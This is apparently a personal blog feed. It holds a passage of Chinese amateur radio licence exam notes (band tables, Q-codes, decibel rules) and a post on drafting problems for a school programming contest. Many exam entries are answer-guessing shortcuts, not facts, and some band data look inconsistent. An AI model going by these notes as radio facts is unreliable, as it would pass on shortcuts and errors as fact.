F3E</p><table><thead><tr><th>米数</th><th>频率</th><th>业务</th></tr></thead><tbody><tr><td>160</td><td>1800-2000</td><td>主要业务</td></tr><tr><td>80</td><td>3.5-3.9</td><td>主要业务</td></tr><tr><td>20</td><td>14-14.25</td><td>专用 14.25-14.35 主要业务</td></tr><tr><td>15</td><td>21-21.45</td><td>专用</td></tr><tr><td>10</td><td>28-29.7</td><td>专用</td></tr><tr><td>6</td><td></td><td>主要业务(2m6m选主要,0.7m选18的那个次要)</td></tr><tr><td>2</td><td></td><td>主要业务</td></tr><tr><td>0.7</td><td></td><td>次要业务</td></tr></tbody></table><table><thead><tr><th>频率</th><th>模式</th><th>频率</th></tr></thead><tbody><tr><td>7MHz</td><td>LSB</td><td>7.030-7.200</td></tr><tr><td>10MHz</td><td>USB</td><td>14.100-14.350</td></tr><tr><td>18MHz</td><td>USB</td><td>18.1105-18.168</td></tr><tr><td>21MHz</td><td>USB</td><td>选那个带除去的</td></tr><tr><td>24MHz</td><td>USB</td><td>24.9305-24.99</td></tr><tr><td>29MHz</td><td>USB</td><td>28.3-29.3(29.3-29.51不得占用)</td></tr><tr><td>29MHz</td><td>FM</td><td>29.51-29.7</td></tr></tbody></table><table><thead><tr><th>频率</th><th>名称</th><th>简写</th></tr></thead><tbody><tr><td>135.7 ~ 137.8K</td><td>低（长）</td><td>L</td></tr><tr><td>1.8 ~ 2M</td><td>中（中）</td><td>M</td></tr><tr><td>28M</td><td>高（短）</td><td>H</td></tr><tr><td>50M</td><td>甚（米）</td><td>V</td></tr><tr><td>2.4Ghz Wi-Fi</td><td>特高频（分米波）</td><td>U</td></tr><tr><td>5G</td><td>超（厘米）</td><td>S</td></tr><tr><td>10G</td><td>超（厘米）</td><td>S</td></tr><tr><td>241G</td><td>极（毫）</td><td>E</td></tr></tbody></table><h2 id="避开频率的神秘常数">避开频率的神秘常数</h2><p>18.068   <code>*.2,*.3,*.2</code></p><p>IARU信标台:避开 <code>18.110</code><br>避开10MHz(授时台)</p><h2 id="Calc">Calc</h2><p>$$\mathrm{1dBd=1+2.15dBi}$$$$\mathrm{a,dBi-b,dBi=(a-b)dB}$$信号功率:上面算出来差值dB之后,甲是乙多少倍:$$10^{0.1\times c}$$分贝计算:</p><p><strong>功率</strong> :增强100倍-&gt;20dB<br><strong>电压</strong> :增强100倍-&gt;40dB(功率增强10000倍)</p><p>信号通过多个增益电路:直接相加.</p><p>注意:dB是一个相对的概念,dBm和 $\mathrm{dB\mu}$ 都是绝对概念,不能直接转换.<br>$\mathrm{0dBm}$ 对应 $\mathrm{1mW}$<br>$\mathrm{0dB\mu}$ 对应 $\mathrm{1\mu W}$ ($\mathrm{0dB\mu}+30\mathrm{dB}=30\mathrm{dB}\mu$)$$P_{\mathrm{dB}}=10\times\lg(P_2/P_1)$$换成增益是 $8.15dBi$ 的天线怎么变:$$8.15-2.15=6$$故正好增一档.</p><p><strong>要注意看清是收发双方都改天线还是只有一个人改天线了.</strong></p><h2 id="Q简语">Q简语</h2><p>QR:questioning radio(要我…吗)<br>QS:questioning signal(信号…样)</p><p>QRO 要我增加发射功率吗?<br>QRP 要我降低发射功率吗? 请降低发射功率.</p><p>QRA 你台名称? 我台名称是…<br>QRH 我的频率稳定吗? 你的频率不稳定.<br>QRL 你忙吗?(有人使用频率吗?) 我很忙,请不要打扰.<br>QRU 你和我还有事吗? 我和你没事了.</p><p>QRV 你是否已经准备好?(receive接收)</p><p>QSO x 我能和x直接通信吗?</p><p>QSA 我的信号强度如何(强吗)? 你的信号很强.<br>QSB 信号弱(衰减)吗? 你的信号很弱.<br>QSD 我发报手法有毛病吗? 你的发报手法有毛病.<br>QSX 守听频率xx<br>QSY 改变频率到xx<br>QSK 从信号间隙接收<br>QSL 卡<br>QSP 能传信给(pass)xx吗? 我能传信给xx.</p><p>单词相关:<br>QRN:Natural天电<br>QRM:Manual人工<br>QRQ:Quick加快<br>QRS:Slow减速<br>QRT:sTop停止</p><table><thead><tr><th>其他缩写</th><th>意思</th></tr></thead><tbody><tr><td>ATT</td><td>衰减(不是衰落)</td></tr><tr><td>GA</td><td>继续,go on</td></tr><tr><td>KP</td><td>守听,keep(不是RCV)</td></tr><tr><td>HST</td><td>快速收发报(high speed telegraph)</td></tr><tr><td>AS</td><td>请稍等(a second)</td></tr><tr><td>C</td><td>碰到,见面(see)</td></tr><tr><td>CHEERIO</td><td>再会,祝贺</td></tr><tr><td>CL</td><td>关闭(呼叫)(close/call)</td></tr><tr><td>CLS</td><td>呼号call sign</td></tr><tr><td>CLG</td><td>呼叫(clling)</td></tr><tr><td>EL,ELE,ELS</td><td>单元(天线振子),element(和复数),注意不是UNIT</td></tr><tr><td>ES</td><td>和(ampersand, <code>&amp;</code> )</td></tr><tr><td>FB</td><td>很好的(fine business)</td></tr><tr><td>FR,FER</td><td>为了,对于(for)</td></tr><tr><td>G[]</td><td>good morning早上好啥的一堆</td></tr><tr><td>GLD</td><td>高兴(glad)</td></tr><tr><td>BJT</td><td>北京时间</td></tr><tr><td>BURO</td><td>QSL卡片局</td></tr><tr><td>HR</td><td>这里,听到(here hear)</td></tr><tr><td>MNY,MNI</td><td>很多(many)</td></tr><tr><td>NW</td><td>现在(now)</td></tr><tr><td>P O BOX</td><td>邮政信箱</td></tr><tr><td>RPRT</td><td>报告 report(不是PRT)</td></tr><tr><td>SK</td><td>结束通信(stop keep)</td></tr><tr><td>STN</td><td>电台(station)</td></tr><tr><td>TNX,TKS</td><td>谢谢</td></tr><tr><td>TU</td><td>谢谢你(U you)</td></tr><tr><td>WKD</td><td>工作过(worked)</td></tr><tr><td>XYL</td><td>妻子,已婚女子(ex-young lady前年轻女子)</td></tr><tr><td>YL</td><td>年轻女子</td></tr><tr><td>88</td><td>异性操作员的美好祝愿(love and kiss)</td></tr><tr><td>LW</td><td>长线天线(long wire)</td></tr><tr><td>LP</td><td>对数周期天线(log period)</td></tr><tr><td>ppm</td><td>百万分比(part per million),描述频率的相对稳定程度</td></tr></tbody></table><h2 id="神秘不变量">神秘不变量</h2><p>信号幅度不变: 移频键控FSK 频率调制FM 相位调制PM 移相键控调制PSK<br>信号周期不变: 相位调制PM<br>载频分量幅度不变: 幅度调制AM<br>频带宽度可能大于原有值: 频率调制FM(理论频带无穷宽)</p><h2 id="专有名词">专有名词</h2><p>ALC:auto level control(发信自动电平控制)<br>AT:auto antenna(自动天调)<br>ATT:attenuator(衰减器)<br>AGC:auto gain control(自动增益控制)<br>PRE: <strong>前置</strong> 放大器<br>PROC:语音压缩(compress)<br>RIT:(receive)接收增量调谐(tuning)<br>XIT:发射增量调谐</p><p>RTTY:频移电报技术</p><p>NB,SQL:选最长的</p><p>CTCSS:选数值最小的</p><p>VFO:可变频率振荡器(variable-frequency oscillator)<br>XTAL:石英晶体元件quartz crystal</p><h1>知识</h1><ol><li><p>频偏:声音幅度决定信号的一个东西,更大声音说话会增加频偏,和机子,功率无关.</p></li><li><p>10m(28-29.7)在白天更适合通联,因为白天太阳活动更频繁,电离的情况更好.</p></li><li><p>协调无线电管理的是 <code>国际电信联盟</code> .</p></li><li><p>划定的频率怎么用?实际可以工作的发信频率需要[d+信号下边带的频率宽度,u-信号上边带的频率宽度]</p></li><li><p>减幅波辐射:电打火(最早的电码就是用火花放电控制时间构成电码,这是一种波长很短的减幅波,振幅衰减很快,干扰极大)</p></li><li><p>无线电波:3000G赫兹以下的在空间传播的电磁波</p></li><li><p>时区:24个,本初子午线经过0区,西比东晚</p></li><li><p>ITU分区只有3个区,中国在3区,南北美洲为二区</p></li><li><p>SASE:写好收信人地址的信封(self addressed and stamped envelope)</p></li><li><p>单边带语音压缩:压强升弱</p></li><li><p>不知道选什么就选最乖巧懂事的</p></li><li><p>频率失真:各频率分量比例发生了改变<br>非线性失真:产生了新的频率分量<br>相位失真:相位</p></li><li><p>有源元器件:半导体三极管(需要外部能量才能工作的器件,主要是信号放大,变换,整流)(二极管,晶体管,三极管,集成电路)<br>耐压指标:电容(会被击穿)<br>耗散功率:电阻(散热功率)<br>提供旁路的元件:电容</p></li><li><p>(信号判断)<br>SSB听到两种音调交替:FSK<br>SSB听到音调不变但是似乎不断颤动的信号:PSK<br>SSB听到&quot;嘟嘟&quot;声:SSTV或FAX</p></li><li><p>损耗:低频损耗小</p></li><li><p>高频电流有趋肤效应</p></li><li><p>绝缘物体:介质损耗</p></li><li><p>BW:选3dB的那个</p></li><li><p>截止频率:选带dB的那个3dB带宽:选0dB变化到-3dB的那个</p></li><li><p>滤波器:阶数越高抑制效果越好</p></li><li><p>频率稳定度:RC &lt; LC &lt; 石英管</p></li><li><p>振荡器必备元素:放大器,正反馈电路</p></li><li><p>选频率:AM应该给最大的频率(6k)<br>PSK31(低速率)只需要很短的带宽,给最小的就可以.</p></li><li><p>三阶互调:两个频率加起来是3.</p></li><li><p>差拍:两者之差</p></li><li><p>频谱仪:<br>CW:闪动的垂直线<br>RTTY:两条闪动垂直线<br>SSB:随语音出现和变化的非对称垂直线<br>AM:一条固定垂直线,左右伴随别的东西</p></li><li><p>用 <strong>频谱瀑布图</strong> 描述LC振荡器温度漂移程度.</p></li><li><p>放大器ABCD:放大器件的工作点所处范围<br>A:始终工作在线性区<br>B:半个周期线性区,半个周期截止区<br>C:xx<br>D:半个周期截止区半个周期饱和区</p></li><li><p>两个并联功率管:双倍功率输出<br>两个串联功率管:推挽放大电路</p></li><li><p>信号实际占用带宽:选平齐而且最后长的那个</p></li><li><p>异步(不属于同步):RTTY</p></li><li><p>RTTY常见设定:选带 <code>N</code> 的那个</p></li><li><p>接收机抗拒:选 <em>前端带宽</em><br>如果有两倍就选 <em>镜像抑制比</em></p></li><li><p>制约现代接收机灵敏度的因素:机内噪声</p></li><li><p>中继台上下行用一个天线要加 <strong>双工器</strong> .</p></li><li><p>我国第一颗业余卫星:2009年</p></li><li><p>计算天线发射仰角:简单几何方法计算</p></li><li><p>天调:选开头是补偿的…</p></li><li><p>HF外界噪声较(UHF)高</p></li><li><p>镜频干扰:第一中频:A,接收:B,可能:A+2B or A-2B</p></li><li><p>中频滤波器:防止邻近频率干扰<br>预选滤波器:抑制镜频</p></li><li><p>三阶互调: <code>()/2</code></p></li><li><p>信号速率:VHF和HF都要选最慢的.</p></li><li><p>ITA2码:选没见过的那个码</p></li><li><p>水平偶极天线振子长度:1/2波长的奇数倍(最大增益)<br>1/2波长的整数倍(谐振)</p></li><li><p>巴伦:平衡与不平衡的英文字头组合</p></li><li><p>对于中国HAM来说稀有又困难的是: <code>KP5A</code></p></li><li><p>3V,啥啥的:选T开头的选项</p></li><li><p>电离层影响由低到高: <code>D E F1 F2</code> ,D衰减电波,EF能反射电波</p></li><li><p>太阳黑子的活动周期是11.2年.</p></li><li><p>高次谐波:二级整流或三极管放大器</p></li><li><p>OP附近噪音很响:调整话筒增益</p></li><li><p>大写&quot;四分之一波长&quot;选奇数倍</p></li><li><p>北京通联纽约:东方和西方联通</p></li><li><p>由大到小:FM AM SSB</p></li><li><p>对称半波振子:波长是1/4,俩凑一起是1/2.</p></li><li><p>静寂区:HF和天波地波传播不到的区域</p></li><li><p>CQ分区和埃及相同的: <code>5A</code></p></li><li><p>车上安装的移动电台的高频啸叫声的来源是: <code>发电机</code> .</p></li><li><p>听起来音调偏高偏低的SSB变正常:RIT(receiver incremental tuning)</p></li><li><p>电位器:阻值可按某种变化规律调节的电阻元件.(滑动变阻器换了个名字)</p></li><li><p>镍氢电池:1.2V<br>晶体管:能当开关,能当放大器用</p></li><li><p>房子题:1234按顺序来.</p></li><li><p>相控阵:48.8偶极天线:71.3</p></li><li><p>元件识别</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  |--         |--          |--</span><br><span class="line">--|         --|            |</span><br><span class="line">  |&lt;- PNP     |-&gt; NPN    -&gt;|-- 结型场效应半导体三极管</span><br></pre></td></tr></table></figure><ol start="66"><li><p>CTCSS范围:非常小,选最小的.</p></li><li><p>ATV通信为什么要至少1.2GHz?</p><blockquote><p>因为占用带宽太高,较低业余频段不足以容纳</p></blockquote></li><li><p>交流电<br>电感:电流与电压成正比,与电感成反比.<br>电容:与电压和电容量都成正比.</p></li><li><p>两个测数的题:出现理想选0,出现巴伦选无穷大</p></li><li><p>不慎被大电压电击:选变压器</p></li><li><p>经过全波整流电路:认为放热一样</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里是中国业余无线电B证考试的指南.&lt;/p&gt;
&lt;p&gt;Flu花了一天半的时间刷题备考看资料,最后以 &lt;code&gt;45/50&lt;/code&gt; 的成绩过了B,故下面的内容不再维护.&lt;br&gt;
(不过Flu心情好了可能改改排版什么的)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;速通是对的</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>青云悲出题感想</title>
    <link href="https://narafluorine.github.io/2025/04/26/20006_ToMakeTsingyunProblems/"/>
    <id>https://narafluorine.github.io/2025/04/26/20006_ToMakeTsingyunProblems/</id>
    <published>2025-04-26T04:27:36.000Z</published>
    <updated>2025-12-25T19:06:05.649Z</updated>
    
    <content type="html"><![CDATA[<p><strong>无论如何,Flu不会再出题了.</strong> 出题得不到什么奖励,出不好还会被骂,出题的时候要考虑各种情况(比如正解,代码长度,时限到底开多少,部分分怎么给,怎么卡掉非正解,可能有什么做法能草过去),还有人不干活,团委整天拖报销咋办…</p><p>所以这篇文章被公开了,以纪念Flu因为出题花费的非常非常多的时间.</p><blockquote><p>青云悲并不是算法竞赛,我们不能&quot;碰瓷&quot;ACM.所以青云悲的预期是大家都能参加的校级程序竞赛.(直观体验就是,第四届好像有气球发第五届没了)</p></blockquote><blockquote><p>出智商测试题的,假设最高量程250,自己智商可以没有250.<br>所以作为CF的 $\color{blue}\mathrm{NaraFluorine}$ ,我出的只是签到题,我认为是不存在实力问题的,用我们的话说,你尽量不要让选手爆零.(哦对了,我们今年还是有士力架发的,可以多拿几块再走,反正是团委报销)</p></blockquote><blockquote><p>T5是一道工程题,这是和算法竞赛区别最大的地方.在这里,不会写高难代码的人可以使用奇妙的idea干翻传统算竞选手(真的,去年好像是50-100-100-200-500,可见最后一个题有多重要)<br>讲一个真实的例子:去年考压缩图片,你要让压缩后的图片尽可能的小,但是我们给你 $4%$ 的大容错率让你有损压缩,结果一个能得两百三十分的程序做法非常生草:直接丢弃图片末尾几个像素卡容错率.这简直不用怎么写代码,但是确实能得高分.</p></blockquote><h1>To Make Problems For Tsingyun Cup 6th</h1><p>Flu作为出题人出了T2,和大家共同出了T5,中间有很多很多提案被否了,出于实现难度或时间限制.</p><h1>ideas</h1><p>记录大家探讨的结果,尽管可能对最终题目的选择没有多大影响,但是我们探究过,我们努力过.</p><h1>A1. Neko hit UB with O2</h1><h1>A1. 猫猫用O2打下UB</h1><h2 id="512MB-3s">512MB,3s</h2><h2 id="题目背景">题目背景</h2><p>从堆区访问回来的$猫猫学长$全然不顾身体的疲惫,连夜找我们几个局部变量商量主函数的安排.谈得晚了,便送我们出栈,要地址送我们回内存.在去总线的路上,我们说:“$猫学长$,您回去休息吧.您刚从堆区回来.” ;</p><p>$猫猫$学长摇摇尾巴,&quot;不碍事,你们知道现在国际上有很多人把C++当作敌人,不断给我们制造麻烦,你们是语言的未来,你们的事情便是语言的事情,是头等大事.&quot;我们都激动了,眼里噙着01.多好的$猫猫学长$呀. ;</p><p>$猫猫$抬头看看STL库说:“如果C++真像这STL库这么有条不紊就好了,但是就有一些代码,像死循环,要搞乱这门语言,他们是罪人.” ;</p><p>说着,$猫猫学长$弯下腰,从pragma里捡出一颗O2,然后看着代码说:“该死的无返回值.” ;</p><p>说着祂把O2奋力向上一掷.很快就见空中一段函数突然爆发出耀眼的强光,然后就坠落下来.“这是函数的死循环,他们一直在CPU盘旋,侵犯我们的主权,我已经忍了很久了.”$猫猫$愤愤地说.全局变量们都鼓起掌来,为C++有这样的领导人感到自豪. ;</p><p>一会$猫猫$叫来指针问:“那个函数落到什么地方了?”&quot;好像是输出流一带.&quot;指针说. ;</p><p>$猫猫$学长一怔,说:&quot;赶紧派变量去查,看有什么问题没有.&quot;之后学长送我们到数据总线,一直挥手到看不见我们. ;</p><p>第四天我们听说输出流那边出事了,我们很紧张.而这时$猫猫$学长叫我们过去. ;</p><p>祂依然那么慈祥,让我们坐下说:&quot;程序运行总是要有牺牲的.为计算事业牺牲的变量是伟大的.&quot;祂这时低下头说:“但我必须承认,我当时击落死循环函数的行为太鲁莽了,我在这里向全部变量们道歉.我将向全部变量说明情况.” ;</p><p>我们顿时热01盈眶,多好的学长呀,他在跟UB斗争过程中的小失误竟然被他记在心里,还道了歉,我们在将来的学习中一定要向$猫猫学长$学,学祂那宽广的胸怀,和不耻下问的精神. ;</p><h2 id="题意简述">题意简述</h2><p><code>UB</code> 是 <code>Undefined Behavior</code> 的缩写,意思是未定义行为.众所周知在C++中有很多未定义行为,包括但不限于,带符号整数算术溢出,越界访问,无可视副作用的无限循环等.</p><p>现在,您将对编译器的行为以及优化发起探索,了解其中的奥秘.</p><p>我们有 $q$ 个询问,每次给出一个数字 $n$ ,您需要计算下面代码中$$\begin{aligned}&amp;\mathrm{int},a=0\&amp;\mathrm{int},b=\underbrace{++a+\quad++a+\quad++a+…+\quad++a}_{n个a}\end{aligned}$$的 $b$ 最后的值是多少.</p><h2 id="输入格式">输入格式</h2><p>第一行一个整数 $q$ ,表示有多少次询问.<br>第 $2$ 行至第 $q+1$ 行,一行一个整数 $n$ .</p><h2 id="输出格式">输出格式</h2><p>$q$ 行,一行一个整数,表示上面代码的值.</p><h2 id="样例输入-输出">样例输入/输出</h2><p><strong>输入#1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">1</span><br><span class="line">7</span><br></pre></td></tr></table></figure><p><strong>输出#1</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">29</span><br></pre></td></tr></table></figure><p><strong>样例解释</strong> :第一个询问中, $b=++a$ ,答案是 $1$ .<br>第二个询问中, $b=++a+\quad++a+\quad++a+\quad++a+\quad++a+\quad++a+\quad++a$ ,产生了UB,总之最后答案是 $29$ .</p><p><strong>样例参考代码</strong> :</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> b=++a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,b);</span><br><span class="line">a=<span class="number">0</span>;</span><br><span class="line">b=++a+ ++a+ ++a+ ++a+ ++a+ ++a+ ++a;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据范围">数据范围</h2><p>对于前 $20%$ 的数据, $1\le n,q\le10$ .<br>对于另 $20%$ 的数据, $1\le n,q\le50$ .<br>对于另 $20%$ 的数据, $1\le n,q\le100$ .<br>对于最后 $40%$ 的数据, $1\le n,q\le10^7$ .</p><h2 id="参考资料">参考资料</h2><p>运算符优先级</p><p>常见存储格式的范围(这是在提醒选手后面的测试真的会炸int,而且是故意炸int)</p><p>C++编译行,怎么输入,怎么输出的命令</p><p>C++如何调用Windows命令行</p><p>在线cpp转汇编(这个主要是误导选手一波,让他们见识见识高级工具得了,答案不在里面,放在最后)</p><h1>出题者语</h1><p><strong>(这个是出题的时候的大纲啊这个题的价值观啊啥的,不放在题面)</strong></p><p>这个题的走UB流程的正解是,先写一个对n输出答案生成器的程序,然后用给出的命令让选手刚才输出程序跑起来,得到答案,这个是一个表,提交的时候直接交表就行了.</p><p>为了防止有人真的爆零,我们给出样例的参考代码,反正也只能过样例,标答是个表…</p><p><strong>然而</strong>,这个题经过Flu的测试,只有两个及以上会产生UB(UB的原理是编译器只把前两个捆绑到一起算了,后面好像是个栈一样的算),也就是说超过2项的可以O(1)算…但是小心int溢出,这个题就是让int溢出的,别到时候玄学WA在int上面…</p><p><strong>不该给C++调用Linux命令的参考资料</strong>,防止选手交上去一个在线编译的,在线输出在线跑的,<s>而且1e7你敢跑我敢让你T飞</s></p><p><strong>一定</strong> 要测试各种情况,包括但不限于</p><ul><li>各种编译器</li><li>各种编辑器</li><li>各种优化</li><li>各种展开</li><li>选手机器</li><li>Linux能跑吗?不可选就ban了,反正青云悲也只能用C++交.</li></ul><hr><h1>A2.人机验证</h1><p>题目已经公开在洛谷.</p><p><a href="https://www.luogu.com.cn/problem/U479485">https://www.luogu.com.cn/problem/U479485</a></p><hr><h1>B1. 菊花魔塔</h1><h1>B1. Chrysanthemum Mota Game</h1><h2 id="3s-256MB">3s , 256MB</h2><p>你说得对,但是前面忘了,后面忘了,总之菊花魔塔是一个游戏,游戏中你将扮演一名勇者,挑战魔塔的怪物,收集加成道具,最终到达魔塔之巅.</p><p>菊花魔塔的构造可以简化为n个房间,每一个房间门口会有一只怪物.您随时可以造访任意一个房间,但走进房间前必须击败门口的怪物.房间内可能有加成道具(门会在您走的时候消失,所以您只能到访任意一个房间一次),您的目标是到达终点房间.菊花魔塔只有一层,即每把游戏只要能活着到达终点房间立刻胜利.</p><p>在菊花魔塔中,勇士和怪物都有以下属性值:生命值(hp),攻击力(atk)和防御值(def).<br>其中每次攻击造成的伤害值公式是 $\max(atk-def,0)$ ,即如果您砍怪物一刀,伤害是$5$,怪物防御是$3$,则怪物实际生命值会减$2$点,如果您的攻击是$2$,则怪物不会受到伤害.<br>您与怪物的对战可以简单理解为,您先砍怪物一刀,然后怪物砍你一刀,然后您再砍怪物一刀,以此类推,直到一方死亡,中途不可逃跑.死亡的定义是任意时刻生命值小于等于0.</p><p>在菊花魔塔中,加成道具有以下四种:</p><p>攻击药水(让攻击力永久+1)<br>防御药水(让防御力永久+1)<br>生命药水(让生命值+1)<br>剑(让当前攻击力+x,没有耐久可以一直用,但是您同时只能携带一把剑)</p><p>本题采取多测,每次独立,角色初始属性,每个怪物的属性和每个房间的道具数量会告诉您,您只需要对每次询问给出一行一个 <code>Yes</code> 或 <code>No</code> 表示勇士能不能到达魔塔的终点房间.</p><p>本题所有测试点公开,测试用例在下面:xx<br>我们还准备了菊花魔塔的游戏,您写程序输出答案提交只要正确也可得分.网页:xx</p><h2 id="输入">输入</h2><p>第一行两个整数,表示子任务($subtask$)编号和测试点个数($T$).</p><p>每个测试点第一行有两个整数n和t,代表房间的数量和终点房间的编号(房间从1开始编号).接下来n行每行7个整数,分别表示表示第i号房间的怪物的生命值(如果是0则该房间没有怪物),攻击力,防御力,该房间的攻击药水的数量,防御药水的数量,生命药水的数量,以及该房间剑的攻击力加成x(如果是0则该房间没有剑).<br>第n+1行是三个整数,表示自己的生命值,攻击力和防御力,您初始时是没有剑的.</p><h2 id="输出">输出</h2><p>一行一个字符串<code>Yes</code>或<code>No</code>,表示该测试点中勇士能不能到达终点房间.</p><h2 id="样例">样例</h2><h3 id="样例输入-1">样例输入#1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0 1</span><br><span class="line">4 1</span><br><span class="line">229 113 0 114 514 1919 810</span><br><span class="line">300 200 0 0 0 1 0</span><br><span class="line">300 200 0 0 1 0 0</span><br><span class="line">300 200 0 1 0 0 0</span><br><span class="line">514 114 0</span><br></pre></td></tr></table></figure><h3 id="样例输出-1">样例输出#1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes</span><br></pre></td></tr></table></figure><h3 id="样例解释-1">样例解释#1</h3><p>先去4号房间,杀怪后114剩滴生命值,获得1点攻击(药水效果),然后直接去1号最终房间,杀怪后剩1滴血存活,所以输出<code>Yes</code>.</p><h2 id="数据范围-约定">数据范围,约定</h2><p>本题共20个测试点,一共100分,子任务测试数据会下发,<a href="https://jlu.edu.cn">链接</a>.<br>此外我们还准备了测试用例的游戏版本,您也可以通过游玩游戏得到答案,<a href="https://jlu.edu.cn">链接</a></p><p>然后这里是数据表格,题面先过审了再出数据的说,</p><p><code>|$$|$$|$$|$$|||</code></p><h2 id="Flu想说的-这段不算在题面">Flu想说的(这段不算在题面)</h2><p>有一个小问题:我们怎么给部分分??Flu的方向有:</p><ol><li>单测和多测都有(单测只有俩,就是让骗分的)</li><li>有些子任务没防御,有些子任务没有剑,有些子任务没有药水.</li><li>有些子任务人和怪物的值域比较小,(给不会快速计算人怪互砍伤害的人一个机会)</li><li>有些子任务房间数比较少</li></ol><table><thead><tr><th style="text-align:center">子任务编号</th><th style="text-align:center">测试点组数$T$</th><th style="text-align:center">n的范围</th><th style="text-align:center">$\sum n$的范围</th><th style="text-align:center">特殊约定</th><th style="text-align:center">备注(不算题面)</th></tr></thead><tbody><tr><td style="text-align:center">$1$</td><td style="text-align:center">$1$</td><td style="text-align:center">$4$</td><td style="text-align:center">$4$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$2$</td><td style="text-align:center">$5$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$3$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$4$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$5$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$6$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$7$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$8$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$9$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$10$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$11$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$12$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$13$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$14$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$15$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center">$$</td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$16$</td><td style="text-align:center">$1$</td><td style="text-align:center">$20$</td><td style="text-align:center">$20$</td><td style="text-align:center"></td><td style="text-align:center">这个点的正解是骗分,因为Yes或No最多一次就能看出来,尽量不要让正解在考场上算出来,哈哈</td></tr><tr><td style="text-align:center">$17$</td><td style="text-align:center">$5$</td><td style="text-align:center">$[1,11]$</td><td style="text-align:center">$[1,55]$</td><td style="text-align:center">无</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$18$</td><td style="text-align:center">$20$</td><td style="text-align:center">$[1,11]$</td><td style="text-align:center">$[1,110]$</td><td style="text-align:center">无</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$19$</td><td style="text-align:center">$20$</td><td style="text-align:center">$[1,11]$</td><td style="text-align:center">$[1,110]$</td><td style="text-align:center">无</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">$20$</td><td style="text-align:center">$20$</td><td style="text-align:center">$[1,11]$</td><td style="text-align:center">$[1,110]$</td><td style="text-align:center">无</td><td style="text-align:center"></td></tr></tbody></table><p>这个题就是纯暴搜,dfs的参数会比较多而已.</p><p>主要考察暴搜怎么写(n!就行了),以及如何快速计算人和怪物之间互砍的伤害(这个应该也不难),以及输入(每个房间怪的属性,以及打完了得多少个什么东西,输入略微有一点麻烦),以及清空数组的能力(多测一定要卡掉不清数组的,这不是好习惯).</p><p>多测是因为每次只需要输出Yes或No就行了,要卡死赌运气的,并不是卡复杂度的.</p><p>关于魔塔问题是npc问题的证明:</p><p><a 